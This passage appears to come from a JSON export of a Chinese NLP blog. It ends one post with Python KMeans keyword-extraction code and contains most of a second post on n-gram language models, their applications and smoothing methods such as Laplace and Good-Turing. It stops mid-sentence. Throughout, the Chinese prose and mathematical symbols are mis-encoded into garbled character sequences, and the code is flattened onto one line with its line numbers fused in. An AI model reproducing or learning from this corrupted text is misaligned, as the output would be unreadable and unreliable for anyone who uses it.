è®¡ç®—å„ç±»åˆ«ä¸‹ï¼Œç»„å†…è¯è¯­ä¸èšç±»ä¸­å¿ƒçš„è·ç¦»ï¼ˆæ¬§å‡ é‡Œå¾—è·ç¦»ï¼‰ï¼ŒæŒ‰èšç±»å¤§å°è¿›è¡Œå‡åºæ’åºï¼› ï¼ˆ6ï¼‰ å¯¹å€™é€‰å…³é”®è¯è®¡ç®—ç»“æœå¾—åˆ°æ’åå‰TopNä¸ªè¯æ±‡ä½œä¸ºæ–‡æœ¬å…³é”®è¯ã€‚ æ­¥éª¤ï¼ˆ4ï¼‰ä¸­éœ€è¦äººä¸ºç»™å®šèšç±»çš„ä¸ªæ•°ï¼Œå…·ä½“å‚è€ƒæ–‡æ¡£ä¸»é¢˜çš„ä¸ªæ•°ã€‚ 123456789101112131415161718192021222324252627282930from sklearn.cluster import KMeansfrom sklearn.decomposition import PCAdef getkeywords_kmeans(data,topK): words = data[\"word\"] # è¯æ±‡ vecs = data.ix[:,1:] # å‘é‡è¡¨ç¤º kmeans = KMeans(n_clusters=1,random_state=10).fit(vecs) labels = kmeans.labels_ #ç±»åˆ«ç»“æœæ ‡ç­¾ labels = pd.DataFrame(labels,columns=['label']) new_df = pd.concat([labels,vecs],axis=1) vec_center = kmeans.cluster_centers_ #èšç±»ä¸­å¿ƒ # è®¡ç®—è·ç¦»ï¼ˆç›¸ä¼¼æ€§ï¼‰ é‡‡ç”¨æ¬§å‡ é‡Œå¾—è·ç¦»ï¼ˆæ¬§å¼è·ç¦»ï¼‰ distances = [] vec_words = np.array(vecs) # å€™é€‰å…³é”®è¯å‘é‡ï¼ŒdataFrameè½¬array vec_center = vec_center[0] # ç¬¬ä¸€ä¸ªç±»åˆ«èšç±»ä¸­å¿ƒ,æœ¬ä¾‹åªæœ‰ä¸€ä¸ªç±»åˆ« length = len(vec_center) # å‘é‡ç»´åº¦ for index in range(len(vec_words)): # å€™é€‰å…³é”®è¯ä¸ªæ•° cur_wordvec = vec_words[index] # å½“å‰è¯è¯­çš„è¯å‘é‡ dis = 0 # å‘é‡è·ç¦» for index2 in range(length): dis += (vec_center[index2]-cur_wordvec[index2])*(vec_center[index2]-cur_wordvec[index2]) dis = math.sqrt(dis) distances.append(dis) distances = pd.DataFrame(distances,columns=['dis']) result = pd.concat([words, labels ,distances], axis=1) # æ‹¼æ¥è¯è¯­ä¸å…¶å¯¹åº”ä¸­å¿ƒç‚¹çš„è·ç¦» result = result.sort_values(by=\"dis\",ascending = True) # æŒ‰ç…§è·ç¦»å¤§å°è¿›è¡Œå‡åºæ’åº å¯ä½¿ç”¨PCAé™ç»´ï¼Œä½†å…·ä½“è§†æ•ˆæœè€Œå®šã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"fastText","slug":"fastText","permalink":"https://racleray.github.io/tags/fastText/"},{"name":"word2vec","slug":"word2vec","permalink":"https://racleray.github.io/tags/word2vec/"},{"name":"representation","slug":"representation","permalink":"https://racleray.github.io/tags/representation/"}]},{"title":"è¯­è¨€æ¨¡å‹","slug":"è¯­è¨€æ¨¡å‹","date":"2020-07-06T14:59:57.000Z","updated":"2023-08-07T11:54:31.049Z","comments":true,"path":"posts/3423f471.html","link":"","permalink":"https://racleray.github.io/posts/3423f471.html","excerpt":"ä¼ ç»Ÿè¯­è¨€æ¨¡å‹çš„ç›¸å…³æ¦‚å¿µè®°å½•ã€‚é‡ç‚¹æ˜¯å‡ ä¸ªå¹³æ»‘è®¡æ•°çš„æ€æƒ³ï¼Œä»æ‹‰æ™®æ‹‰æ–¯åˆ°Modified Kneser-Ney smoothingï¼Œè®¾è®¡å¾—è¶Šæ¥è¶Šå¤æ‚ã€‚","text":"è‡ªç„¶è¯­è¨€å¤„ç†æ˜¯å…³äºè®¡ç®—æœºç§‘å­¦å’Œè¯­è¨€å­¦çš„äº¤å‰å­¦ç§‘ï¼Œå¸¸è§çš„ç ”ç©¶ä»»åŠ¡åŒ…æ‹¬ï¼š åˆ†è¯ï¼ˆWord Segmentationæˆ–Word Breakerï¼ŒWBï¼‰ ä¿¡æ¯æŠ½å–ï¼ˆInformation Extractionï¼ŒIEï¼‰ï¼šå‘½åå®ä½“è¯†åˆ«å’Œå…³ç³»æŠ½å–ï¼ˆNamed Entity Recognition &amp; Relation Extractionï¼ŒNERï¼‰ è¯æ€§æ ‡æ³¨ï¼ˆPart Of Speech Taggingï¼ŒPOSï¼‰ æŒ‡ä»£æ¶ˆè§£ï¼ˆCoreference Resolutionï¼‰ å¥æ³•åˆ†æï¼ˆParsingï¼‰ è¯ä¹‰æ¶ˆæ­§ï¼ˆWord Sense Disambiguationï¼ŒWSDï¼‰ è¯­éŸ³è¯†åˆ«ï¼ˆSpeech Recognitionï¼‰ è¯­éŸ³åˆæˆï¼ˆText To Speechï¼ŒTTSï¼‰ æœºå™¨ç¿»è¯‘ï¼ˆMachine Translationï¼ŒMTï¼‰ è‡ªåŠ¨æ–‡æ‘˜ï¼ˆAutomatic Summarizationï¼‰ é—®ç­”ç³»ç»Ÿï¼ˆQuestion Answeringï¼‰ è‡ªç„¶è¯­è¨€ç†è§£ï¼ˆNatural Language Understandingï¼‰ OCR ä¿¡æ¯æ£€ç´¢ï¼ˆInformation Retrievalï¼ŒIRï¼‰ è¯­è¨€æ¨¡å‹ä¸åº”ç”¨ â€‹ ä¸Šä¸ªä¸–çºª80å¹´ä»£åæœŸï¼Œæœºå™¨å­¦ä¹ ç®—æ³•è¢«å¼•å…¥åˆ°è‡ªç„¶è¯­è¨€å¤„ç†ä¸­ï¼Œè¿™è¦å½’åŠŸäºä¸æ–­æé«˜çš„è®¡ç®—èƒ½åŠ›ã€‚ â€‹ ç ”ç©¶ä¸»è¦é›†ä¸­åœ¨ç»Ÿè®¡æ¨¡å‹ä¸Šï¼Œè¿™ç§æ–¹æ³•é‡‡ç”¨å¤§è§„æ¨¡çš„è®­ç»ƒè¯­æ–™ï¼ˆcorpusï¼‰å¯¹æ¨¡å‹çš„å‚æ•°è¿›è¡Œè‡ªåŠ¨çš„å­¦ä¹ ï¼Œå’Œä¹‹å‰çš„åŸºäºè§„åˆ™çš„æ–¹æ³•ç›¸æ¯”ï¼Œè¿™ç§æ–¹æ³•æ›´å…·é²æ£’æ€§ã€‚ è¯­è¨€æ¨¡å‹ â€‹ è¯­è¨€æ¨¡å‹ç®€å•æ¥è®²ï¼Œå°±æ˜¯è®¡ç®—ä¸€ä¸ªå¥å­çš„æ¦‚ç‡ï¼Œæ›´ç¡®åˆ‡çš„è¯´æ˜¯è®¡ç®—ç»„æˆè¿™ä¸ªå¥å­ä¸€ç³»åˆ—è¯è¯­çš„æ¦‚ç‡ã€‚ å¯¹ä¸€å¥è¯ğ‘†=ğ‘¥1,ğ‘¥2,ğ‘¥3,ğ‘¥4,ğ‘¥5,â€¦,ğ‘¥ğ‘›S=x1,x2,x3,x4,x5,â€¦,xnè€Œè¨€ï¼Œå®ƒçš„æ¦‚ç‡ ğ‘ƒ(ğ‘†)=ğ‘ƒ(ğ‘¥1,ğ‘¥2,ğ‘¥3,ğ‘¥4,ğ‘¥5,â€¦,ğ‘¥ğ‘›)=ğ‘ƒ(ğ‘¥1)ğ‘ƒ(ğ‘¥2|ğ‘¥1)ğ‘ƒ(ğ‘¥3|ğ‘¥1,ğ‘¥2)...ğ‘ƒ(ğ‘¥ğ‘›|ğ‘¥1,ğ‘¥2,...,ğ‘¥ğ‘›âˆ’1) â€‹ è”åˆæ¦‚ç‡é“¾è§„åˆ™å…¬å¼è€ƒè™‘åˆ°äº†æ‰€æœ‰çš„è¯å’Œè¯ä¹‹é—´çš„ä¾èµ–å…³ç³»ï¼Œä½†æ˜¯éå¸¸å¤æ‚ã€‚ä½¿ç”¨é©¬å°”ç§‘å¤«å‡è®¾ï¼ˆMarkov Assumptionï¼‰ç®€åŒ–ï¼šä¸‹ä¸€ä¸ªè¯çš„å‡ºç°ä»…ä¾èµ–äºå®ƒå‰é¢çš„ä¸€ä¸ªæˆ–å‡ ä¸ªè¯ã€‚ â€‹ äºŒå…ƒè¯­æ³•ï¼ˆbigramï¼Œ2-gramï¼‰: \\(P(x_1,x_2,x_3,x_4,x_5,x_6,x_7,x_8,x_9,x_{10})=P(x_1)P(x_2|x_1)P(x_3|x_2)P(x_4|x_3)..P(x_{10}|x_9)\\) â€‹ ä¸‰å…ƒè¯­æ³•ï¼ˆtrigramï¼Œ3-gramï¼‰: ğ‘ƒ(ğ‘¥1,ğ‘¥2,ğ‘¥3,ğ‘¥4,ğ‘¥5,ğ‘¥6,ğ‘¥7,ğ‘¥8,ğ‘¥9,ğ‘¥10)=ğ‘ƒ(ğ‘¥1)ğ‘ƒ(ğ‘¥2|ğ‘¥1)ğ‘ƒ(ğ‘¥3|ğ‘¥1,ğ‘¥2)ğ‘ƒ(ğ‘¥4|ğ‘¥2,ğ‘¥3)Ã—...Ã—ğ‘ƒ(ğ‘¥10|ğ‘¥8,ğ‘¥9) â€‹ ä¸ºä»€ä¹ˆå«â€œè¯­è¨€æ¨¡å‹â€ï¼Ÿå› ä¸ºè¿™æ˜¯ç»Ÿè®¡å­¦æ„ä¹‰ä¸Šçš„æ¨¡å‹ï¼Œåˆè·Ÿè¯­è¨€ç›¸å…³ï¼Œæ‰€ä»¥å«è¯­è¨€æ¨¡å‹ã€‚ç»Ÿè®¡æ¨¡å‹æŒ‡ä¸€ç³»åˆ—åˆ†å¸ƒï¼Œå‚æ•°æ¨¡å‹æŒ‡ä¸€ç³»åˆ—å¯ç”¨æœ‰é™ä¸ªå‚æ•°è¡¨ç¤ºçš„æ¨¡å‹ã€‚è¯­è¨€æ¨¡å‹å°±æ˜¯ä¸€ç§å‚æ•°æ¨¡å‹ï¼Œå®ƒçš„å‚æ•°æ˜¯çŸ©é˜µçš„æ‰€æœ‰cellã€‚ é€‰æ‹©N-gramçš„N â€‹ ç†è®ºä¸Šï¼Œåªè¦æœ‰è¶³å¤Ÿå¤§çš„è¯­æ–™ï¼Œnè¶Šå¤§è¶Šå¥½ï¼Œæ¯•ç«Ÿè¿™æ ·è€ƒè™‘çš„ä¿¡æ¯æ›´å¤š æ¡ä»¶æ¦‚ç‡ä¸ºç»Ÿè®¡è®¡æ•°ï¼š ğ‘ƒ(â€œä¼˜æƒ â€|â€œå‘ç¥¨â€,â€œç‚¹æ•°â€)= (â€œå‘ç¥¨â€,â€œç‚¹æ•°â€ï¼Œâ€œä¼˜æƒ â€) å‡ºç°çš„æ¬¡æ•° / (â€œå‘ç¥¨â€,â€œç‚¹æ•°â€)å‡ºç°çš„æ¬¡æ•° å®é™…æƒ…å†µå¾€å¾€æ˜¯è®­ç»ƒè¯­æ–™å¾ˆæœ‰é™ï¼Œå¾ˆå®¹æ˜“äº§ç”Ÿæ•°æ®ç¨€ç–ï¼Œä¸æ»¡è¶³å¤§æ•°å®šå¾‹ï¼Œç®—å‡ºæ¥çš„æ¦‚ç‡å¤±çœŸã€‚æ¯”å¦‚(â€œå‘ç¥¨â€,â€œç‚¹æ•°â€ï¼Œâ€œä¼˜æƒ â€)åœ¨è®­ç»ƒé›†ä¸­ç«Ÿæ²¡æœ‰å‡ºç°ï¼Œå°±ä¼šå¯¼è‡´é›¶æ¦‚ç‡é—®é¢˜ã€‚ å¤§æ•°å®šå¾‹ï¼šæ ·æœ¬æ•°é‡è¶Šå¤šï¼Œå…¶ç®—æœ¯å¹³å‡å€¼å°±è¶Šè¶‹è¿‘æœŸæœ›å€¼ã€‚ å¦ä¸€æ–¹é¢ï¼Œå¦‚æœnå¾ˆå¤§ï¼Œå‚æ•°ç©ºé—´è¿‡å¤§ï¼Œäº§ç”Ÿç»´æ•°ç¾éš¾ã€‚å‡è®¾è¯è¡¨çš„å¤§å°ä¸º100000ï¼Œé‚£ä¹ˆn-gramæ¨¡å‹çš„å‚æ•°æ•°é‡ä¸º\\(100000^n\\)ã€‚è¿™ä¹ˆå¤šçš„å‚æ•°ï¼Œä¼°è®¡å†…å­˜å°±ä¸å¤Ÿæ”¾äº†ã€‚ â€‹ å¦‚ä½•é€‰æ‹©ä¾èµ–è¯çš„ä¸ªæ•°nå‘¢ï¼Ÿ ç»éªŒä¸Šï¼Œtrigramç”¨çš„æœ€å¤šã€‚å°½ç®¡å¦‚æ­¤ï¼ŒåŸåˆ™ä¸Šï¼Œèƒ½ç”¨bigramè§£å†³ï¼Œç»ä¸ä½¿ç”¨trigramã€‚nå–â‰¥4çš„æƒ…å†µè¾ƒå°‘ã€‚ å½“ï½æ›´å¤§æ—¶ï¼šå¯¹ä¸‹ä¸€ä¸ªè¯å‡ºç°çš„çº¦æŸä¿¡æ¯æ›´å¤šï¼Œå…·æœ‰æ›´å¤§çš„è¾¨åˆ«åŠ›ï¼› å½“ï½æ›´å°æ—¶ï¼šåœ¨è®­ç»ƒè¯­æ–™åº“ä¸­å‡ºç°çš„æ¬¡æ•°æ›´å¤šï¼Œå…·æœ‰æ›´å¯é çš„ç»Ÿè®¡ä¿¡æ¯ï¼Œå…·æœ‰æ›´é«˜çš„å¯é æ€§ã€å®ç”¨æ€§ã€‚ N-gramè¯­è¨€æ¨¡å‹åº”ç”¨ è¯æ€§æ ‡æ³¨ è¯æ€§æ ‡æ³¨æ˜¯ä¸€ä¸ªå…¸å‹çš„å¤šåˆ†ç±»é—®é¢˜ã€‚ â€œçˆ±â€ä½œä¸ºåŠ¨è¯è¿˜æ˜¯æ¯”è¾ƒå¸¸è§çš„ã€‚æ‰€ä»¥å¯ä»¥ç»Ÿä¸€ç»™â€œçˆ±â€åˆ†é…ä¸ºâ€œåŠ¨è¯â€ã€‚è¿™ç§æœ€ç®€å•çš„æ€æƒ³éå¸¸å¥½å®ç°ï¼Œå¦‚æœå‡†ç¡®ç‡è¦æ±‚ä¸é«˜åˆ™ä¹Ÿæ¯”è¾ƒå¸¸ç”¨ã€‚å®ƒåªéœ€è¦åŸºäºè¯æ€§æ ‡æ³¨è¯­æ–™åº“åšä¸€ä¸ªç»Ÿè®¡å°±å¤Ÿäº†ï¼Œè¿è´å¶æ–¯æ–¹æ³•ã€æœ€å¤§ä¼¼ç„¶æ³•éƒ½ä¸è¦ç”¨ã€‚ å¯ä»¥å¼•å…¥2-gramæ¨¡å‹æå‡åŒ¹é…çš„ç²¾ç¡®åº¦ã€‚ ğ‘ƒ(è¯æ€§ğ‘–|â€œå¾ˆâ€çš„è¯æ€§ï¼ˆå‰¯è¯ï¼‰ï¼Œâ€œçˆ±\") = å‰é¢è¢«â€œå‰¯è¯â€ä¿®é¥°çš„â€œçˆ±\"ä½œä¸ºâ€œè¯æ€§ğ‘–â€çš„æ¬¡æ•° / å‰é¢è¢«â€œå‰¯è¯â€ä¿®é¥°çš„â€œçˆ±\"å‡ºç°çš„æ¬¡æ•°ï¼›ğ‘–=1,2,3... åƒåœ¾é‚®ä»¶è¯†åˆ« ä¸€ä¸ªå¯è¡Œçš„æ€è·¯å¦‚ä¸‹ï¼š å…ˆå¯¹é‚®ä»¶æ–‡æœ¬è¿›è¡Œæ–­å¥ï¼Œä»¥å¥å°¾æ ‡ç‚¹ç¬¦å·ï¼ˆâ€œã€‚â€ â€œ!â€ â€œï¼Ÿâ€ç­‰ï¼‰ä¸ºåˆ†éš”ç¬¦å°†é‚®ä»¶å†…å®¹æ‹†åˆ†æˆä¸åŒçš„å¥å­ã€‚ ç”¨N-gramåˆ†ç±»å™¨åˆ¤æ–­æ¯ä¸ªå¥å­æ˜¯å¦ä¸ºåƒåœ¾é‚®ä»¶ä¸­çš„æ•æ„Ÿå¥å­ã€‚ å½“è¢«åˆ¤æ–­ä¸ºæ•æ„Ÿå¥å­çš„æ•°é‡è¶…è¿‡ä¸€å®šæ•°é‡ï¼ˆæ¯”å¦‚3ä¸ªï¼‰çš„æ—¶å€™ï¼Œè®¤ä¸ºæ•´ä¸ªé‚®ä»¶å°±æ˜¯åƒåœ¾é‚®ä»¶ã€‚ æ ¹æ®è´å¶æ–¯å…¬å¼æœ‰ï¼š ğ‘ƒ(ğ‘Œğ‘–|ğ‘‹)âˆğ‘ƒ(ğ‘‹|ğ‘Œğ‘–)ğ‘ƒ(ğ‘Œğ‘–)ï¼›ğ‘–=1,2 å¯¹ğ‘ƒ(ğ‘‹|ğ‘Œğ‘–)P(X|Yi) å¥—ç”¨2-gramæ¨¡å‹ã€‚ åˆ™ä¸Šå¼åŒ–ç®€ä¸ºï¼š ğ‘ƒ(ğ‘Œğ‘–|ğ‘‹)âˆğ‘ƒ(ğ‘‹|ğ‘Œğ‘–)ğ‘ƒ(ğ‘Œğ‘–) âˆğ‘ƒ(ğ‘¥1|ğ‘Œğ‘–)ğ‘ƒ(ğ‘¥2|ğ‘¥1ï¼Œğ‘Œğ‘–)ğ‘ƒ(ğ‘¥3|ğ‘¥2ï¼Œğ‘Œğ‘–)...ğ‘ƒ(ğ‘¥10|ğ‘¥9ï¼Œğ‘Œğ‘–)ğ‘ƒ(ğ‘Œğ‘–) å› ä¸ºè¿™ç§æ–¹æ³•è€ƒè™‘åˆ°äº†è¯è¯­å‰é¢çš„ä¸€ä¸ªè¯è¯­çš„ä¿¡æ¯ï¼ŒåŒæ—¶ä¹Ÿè€ƒè™‘åˆ°äº†éƒ¨åˆ†è¯­åºä¿¡æ¯ï¼Œå› æ­¤åŒºåˆ†æ•ˆæœä¼šæ¯”å•çº¯ç”¨æœ´ç´ è´å¶æ–¯æ–¹æ³•æ›´å¥½ã€‚ N-gramæ–¹æ³•åœ¨å®é™…åº”ç”¨ä¸­æœ‰ä¸€äº›tricks ä»åŒºåˆ†åº¦æ¥çœ‹ï¼Œ3-gramæ–¹æ³•æ›´å¥½äº›ã€‚ å¯ä»¥è€ƒè™‘åœ¨å…¶å‰é¢å†æ·»åŠ ä¸€ä¸ªå¥å­èµ·å§‹ç¬¦å·å¦‚â€œâ€ï¼Œè¿™æ ·æˆ‘ä»¬å°±ä¸å¿…å•ç‹¬è®¡ç®—ğ‘ƒ(â€œæˆ‘â€|ğ‘Œğ‘–)ï¼Œè€Œæ˜¯æ›¿æ¢ä¸ºè®¡ç®—ğ‘ƒ(â€œæˆ‘â€|â€œâ€,ğ‘Œğ‘–)ã€‚å½¢å¼ä¸Šä¸2-gramç»Ÿä¸€ã€‚ è¿™æ ·ç»Ÿè®¡å’Œé¢„æµ‹èµ·æ¥éƒ½æ¯”è¾ƒæ–¹ä¾¿ã€‚(ä¸€èˆ¬åœ°ï¼Œå¦‚æœé‡‡ç”¨N-gramæ¨¡å‹ï¼Œå¯ä»¥åœ¨æ–‡æœ¬å¼€å¤´åŠ å…¥n-1ä¸ªè™šæ‹Ÿçš„å¼€å§‹ç¬¦å·) N-gramæ¨¡å‹ä¹Ÿä¼šå‘ç”Ÿé›¶æ¦‚ç‡é—®é¢˜ï¼Œä¹Ÿéœ€è¦å¹³æ»‘æŠ€æœ¯ ä¸­æ–‡åˆ†è¯ ä¸­æ–‡åˆ†è¯æŠ€æœ¯æ˜¯â€œä¸­æ–‡NLPä¸­ï¼Œæœ€æœ€æœ€é‡è¦çš„æŠ€æœ¯ä¹‹ä¸€â€ï¼Œé‡è¦åˆ°æŸæœç´¢å¼•æ“å‚æœ‰ä¸“é—¨çš„teamåœ¨é›†ä¸­ç²¾åŠ›ä¼˜åŒ–è¿™ä¸€é¡¹å·¥ä½œï¼Œé‡è¦åˆ°èƒ½å½±å“åŒè¯­ç¿»è¯‘ç™¾åˆ†ä½çš„å‡†ç¡®åº¦ï¼Œèƒ½å½±å“æŸäº›queryä¸‹æœç´¢å¼•æ“ç™¾åˆ†ä½çš„å¹¿å‘Šæ”¶å…¥ã€‚ ä¸­æ–‡åˆ†è¯ä¹Ÿå¯ä»¥ç†è§£æˆä¸€ä¸ªå¤šåˆ†ç±»çš„é—®é¢˜ã€‚ğ‘‹è¡¨ç¤ºè¢«åˆ†è¯çš„å¥å­ï¼Œç”¨ğ‘Œğ‘–è¡¨ç¤ºè¯¥å¥å­çš„ä¸€ä¸ªåˆ†è¯æ–¹æ¡ˆã€‚ ğ‘ƒ(ğ‘Œğ‘–|ğ‘‹)âˆğ‘ƒ(ğ‘‹|ğ‘Œğ‘–)ğ‘ƒ(ğ‘Œğ‘–)ï¼›ğ‘–=1,2,3... NOTEï¼šä»»æ„å‡æƒ³çš„ä¸€ç§åˆ†è¯æ–¹å¼ä¹‹ä¸‹ç”Ÿæˆçš„å¥å­æ€»æ˜¯å”¯ä¸€çš„ï¼ˆåªéœ€æŠŠåˆ†è¯ä¹‹é—´çš„åˆ†ç•Œç¬¦å·æ‰”æ‰å‰©ä¸‹çš„å†…å®¹éƒ½ä¸€æ ·ï¼‰ã€‚äºæ˜¯å¯ä»¥å°† ğ‘ƒ(ğ‘‹|ğ‘Œğ‘–)çœ‹ä½œæ˜¯æ’ç­‰äº1çš„ã€‚è¿™æ ·è´å¶æ–¯å…¬å¼åˆè¿›ä¸€æ­¥åŒ–ç®€æˆä¸ºï¼š ğ‘ƒ(ğ‘Œğ‘–|ğ‘‹)âˆğ‘ƒ(ğ‘Œğ‘–)ï¼›ğ‘–=1,2,3... é‡‡ç”¨2-gramã€‚äºæ˜¯æœ‰ï¼š ğ‘ƒ(ğ‘Œ1)=ğ‘ƒ(â€œæˆ‘å¸â€ï¼Œâ€œå¯â€ï¼Œâ€œåŠç†â€ï¼Œâ€œæ­£è§„å‘ç¥¨â€) =ğ‘ƒ(â€œæˆ‘å¸â€)ğ‘ƒ(â€œå¯â€|â€œæˆ‘å¸â€)ğ‘ƒ(â€œåŠç†â€|â€œå¯â€)ğ‘ƒ(â€œæ­£è§„å‘ç¥¨â€|â€œåŠç†â€ï¼‰ ğ‘ƒ(ğ‘Œ2)=ğ‘ƒ(â€œæˆ‘â€ï¼Œâ€œå¸å¯åŠâ€ï¼Œâ€œç†æ­£è§„â€ï¼Œâ€œå‘ç¥¨â€) =ğ‘ƒ(â€œæˆ‘â€)ğ‘ƒ(â€œå¸å¯åŠâ€|â€œæˆ‘â€)ğ‘ƒ(â€œç†æ­£è§„â€|â€œå¸å¯åŠâ€)ğ‘ƒ(â€œå‘ç¥¨â€|â€œç†æ­£è§„â€ï¼‰ æœºå™¨ç¿»è¯‘ä¸è¯­éŸ³è¯†åˆ« N-gramè¯­è¨€æ¨¡å‹åœ¨æœºå™¨ç¿»è¯‘å’Œè¯­éŸ³è¯†åˆ«ç­‰é¡¶çº§NLPåº”ç”¨ä¸­ä¹Ÿæœ‰å¾ˆå¤§çš„ç”¨é€”ã€‚ ç”¨äºåˆ¤æ–­ç”Ÿæˆçš„è¯­å¥çš„åéªŒæ¦‚ç‡ç›¸å¯¹å¤§å°ã€‚ å¹³æ»‘æŠ€æœ¯ æ‹‰æ™®æ‹‰æ–¯å¹³æ»‘ æœ€ç®€å•çš„å¹³æ»‘æŠ€æœ¯æ˜¯æ‹‰æ™®æ‹‰æ–¯å¹³æ»‘ï¼Œ åŠ ä¸€å¹³æ»‘æ³•ï¼Œå…¶ä¿è¯æ¯ä¸ªn-gramåœ¨è®­ç»ƒè¯­æ–™ä¸­è‡³å°‘å‡ºç°1æ¬¡ï¼ˆæˆ–è€…åŠ kï¼‰ã€‚ åˆ†æ¯åŠ ä¸Š\\(k * |V|\\) Back-offæ–¹æ³• è€ƒè™‘k-1å…ƒgram æ’å€¼æ³• å¤šç§gramåŠ æƒ ä¸€å…ƒç»„ \\((w_{i})\\) å‡ºç°çš„æ¬¡æ•°å¹³å‡æ¯”äºŒå…ƒç»„ \\((w_{iâˆ’1},w_{i})\\) å‡ºç°çš„æ¬¡æ•°è¦å¤šå¾ˆå¤šï¼Œæ ¹æ®å¤§æ•°å®šå¾‹ï¼Œå®ƒçš„ç›¸å¯¹é¢‘åº¦æ›´æ¥è¿‘æ¦‚ç‡åˆ†å¸ƒã€‚ç±»ä¼¼åœ°ï¼ŒäºŒå…ƒç»„å¹³å‡å‡ºç°çš„æ¬¡æ•°æ¯”ä¸‰å…ƒç»„è¦é«˜ï¼ŒäºŒå…ƒç»„çš„ç›¸å¯¹é¢‘åº¦æ¯”ä¸‰å…ƒç»„æ›´æ¥è¿‘æ¦‚ç‡åˆ†å¸ƒã€‚ åŒæ—¶ï¼Œä½é˜¶æ¨¡å‹çš„é›¶æ¦‚ç‡é—®é¢˜ä¹Ÿæ¯”é«˜é˜¶æ¨¡å‹è½»ã€‚ \\[P(w_i\\mid w_{i-2},w_{i-1})=\\lambda(w_{i-2},w_{i-1})\\cdot f(w_i\\mid w_{i-2},w_{i-1}) +\\lambda(w_{i-1})\\cdot f(w_i\\mid w_{i-1})+\\lambda f(w_i)\\] å…¶ä¸­ï¼Œä¸‰ä¸ª Î» ä¸ºæ’å€¼æƒé‡ï¼Œå‡ä¸ºæ­£æ•°ä¸”å’Œä¸º 1ã€‚ çº¿æ€§æ’å€¼æ³•çš„æ•ˆæœæ¯”å¡èŒ¨é€€é¿æ³•ç•¥å·®ï¼Œæ•…ç°åœ¨å·²ç»è¾ƒå°‘ä½¿ç”¨äº†ã€‚ å¤å¾·-å›¾çµ åœ¨ç»Ÿè®¡ä¸­ç›¸ä¿¡å¯é çš„ç»Ÿè®¡æ•°æ®ï¼Œè€Œå¯¹ä¸å¯ä¿¡çš„ç»Ÿè®¡æ•°æ®æ‰“æŠ˜æ‰£çš„ä¸€ç§æ¦‚ç‡ä¼°è®¡æ–¹æ³•ã€‚ å¤å¾·-å›¾çµä¼°è®¡çš„åŸç†æ˜¯ï¼š å¯¹äºæ²¡çœ‹è§çš„äº‹ä»¶ï¼Œæˆ‘ä»¬ä¸èƒ½è®¤ä¸ºå®ƒå‘ç”Ÿçš„æ¦‚ç‡å°±æ˜¯é›¶ï¼Œå› æ­¤æˆ‘ä»¬ä»æ¦‚ç‡çš„æ€»é‡(Probability Mass)ä¸­ï¼Œåˆ†é…ä¸€ä¸ªå¾ˆå°çš„æ¯”ä¾‹ç»™è¿™äº›æ²¡æœ‰çœ‹è§çš„äº‹ä»¶ã€‚è¿™æ ·ä¸€æ¥ï¼Œçœ‹è§äº†çš„äº‹ä»¶çš„æ¦‚ç‡æ€»å’Œå°±å°äº 1äº†ã€‚å› æ­¤ï¼Œéœ€è¦å°†æ‰€æœ‰çœ‹è§äº†çš„äº‹ä»¶æ¦‚ç‡è°ƒå°ä¸€ç‚¹ï¼Œå¹¶ä¸”æŒ‰ç…§â€œè¶Šæ˜¯ä¸å¯ä¿¡çš„ç»Ÿè®¡æŠ˜æ‰£è¶Šå¤šâ€çš„æ–¹æ³•è¿›è¡Œã€‚ å‡å®šåœ¨è¯­æ–™åº“ä¸­å‡ºç° r æ¬¡çš„è¯æœ‰ ğ‘ğ‘Ÿä¸ªï¼Œç‰¹åˆ«åœ°ï¼Œæœªå‡ºç°çš„è¯æ•°é‡ä¸º ğ‘0ã€‚è¯­æ–™åº“çš„å¤§å°ä¸º Nã€‚é‚£ä¹ˆï¼Œå¾ˆæ˜¾ç„¶ï¼š \\[N=\\sum_{r=1}^{\\infty}rN_r\\] å‡ºç° r æ¬¡çš„è¯åœ¨æ•´ä¸ªè¯­æ–™åº“ä¸­çš„ç›¸å¯¹é¢‘åº¦(Relative Frequency)åˆ™æ˜¯ \\(r/N_r\\)ã€‚ å½“ r æ¯”è¾ƒå°æ—¶ï¼Œå®ƒçš„ç»Ÿè®¡å¯èƒ½ä¸å¯é ï¼Œå› æ­¤åœ¨è®¡ç®—é‚£äº›å‡ºç° r æ¬¡çš„è¯çš„æ¦‚ç‡æ—¶ï¼Œè¦ä½¿ç”¨ä¸€ä¸ªæ›´å°ä¸€ç‚¹çš„æ¬¡æ•°ï¼Œæ˜¯ \\(d_r\\)ï¼ˆè€Œä¸ç›´æ¥ä½¿ç”¨rï¼‰ã€‚ \\[d_r = (r+1)\\cdot N_{r+1}/N_r\\] æ˜¾ç„¶ \\[\\sum_rd_r\\cdot N_r=N\\] æ ¹æ® \\(Zipf\\) å®šå¾‹ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ \\(N_{r+1}&lt;N_r\\)ï¼Œå› è€Œ \\(d_r&lt;r\\)ï¼Œä»è€Œ \\(d_0&gt;0\\)ã€‚ \\(Zipf\\) å®šå¾‹ï¼šä¸€èˆ¬æ¥è¯´ï¼Œå‡ºç°ä¸€æ¬¡çš„è¯çš„æ•°é‡æ¯”å‡ºç°ä¸¤æ¬¡çš„å¤šï¼Œå‡ºç°ä¸¤æ¬¡çš„æ¯”å‡ºç°ä¸‰æ¬¡çš„å¤šï¼Œè¿™ç§è§„å¾‹ç§°ä¸º Zipfå®šå¾‹(Zipfâ€™s Law)ï¼Œå³ r è¶Šå¤§ï¼Œè¯çš„æ•°é‡ \\(N_r\\) è¶Šå°ã€‚ è¿™æ ·å°±ç»™æœªå‡ºç°çš„è¯èµ‹äºˆäº†ä¸€ä¸ªå¾ˆå°çš„éé›¶å€¼ï¼Œä»è€Œè§£å†³äº†é›¶æ¦‚ç‡çš„é—®é¢˜ã€‚åŒæ—¶ä¸‹è°ƒäº†å‡ºç°é¢‘ç‡å¾ˆä½çš„è¯çš„æ¦‚ç‡ã€‚ å®é™…è¿ç”¨ä¸­ï¼Œä¸€èˆ¬åªå¯¹å‡ºç°æ¬¡æ•°ä½äºæŸä¸ªé˜ˆå€¼çš„è¯ä¸‹è°ƒé¢‘ç‡ï¼Œç„¶åæŠŠä¸‹è°ƒå¾—åˆ°çš„é¢‘ç‡æ€»å’Œç»™æœªå‡ºç°çš„è¯ã€‚ äºæ˜¯ï¼š 